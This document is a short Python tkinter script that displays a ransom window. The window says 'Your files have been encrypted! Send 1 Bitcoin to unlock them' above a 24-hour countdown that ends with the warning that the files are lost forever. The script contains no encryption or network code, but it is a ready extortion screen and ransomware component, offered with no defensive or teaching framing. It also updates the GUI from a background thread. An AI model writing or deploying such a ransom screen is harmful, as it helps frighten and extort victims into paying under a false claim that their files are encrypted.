import tkinter as tk
from tkinter import messagebox
import time
import threading

def show_ransom_gui():
    countdown_time = 1440 * 60  # Moved inside the function

    # Function to update the countdown timer
    def update_timer():
        nonlocal countdown_time
        while countdown_time > 0:
            mins, secs = divmod(countdown_time, 60)
            timer_label.config(text=f"Time Left: {mins:02}:{secs:02}")
            time.sleep(1)
            countdown_time -= 1

        # Show message when time runs out
        messagebox.showwarning("Time Expired", "Your files are lost forever!")

    # Create the main GUI window
    root = tk.Tk()
    root.title("Your Files Have Been Encrypted")
    root.geometry("400x200")
    root.resizable(False, False)

    # Display ransom message
    ransom_message = tk.Label(
        root,
        text="Your files have been encrypted!\nSend 1 Bitcoin to unlock them.",
        font=("Arial", 12),
        wraplength=350,
        justify="center"
    )
    ransom_message.pack(pady=20)

    # Countdown label
    timer_label = tk.Label(root, text="", font=("Arial", 16), fg="red")
    timer_label.pack(pady=10)

    # Start countdown in a separate thread
    t = threading.Thread(target=update_timer)
    t.daemon = True
    t.start()

    root.mainloop()

# Run the GUI when this script is executed directly
if __name__ == "__main__":
    show_ransom_gui()
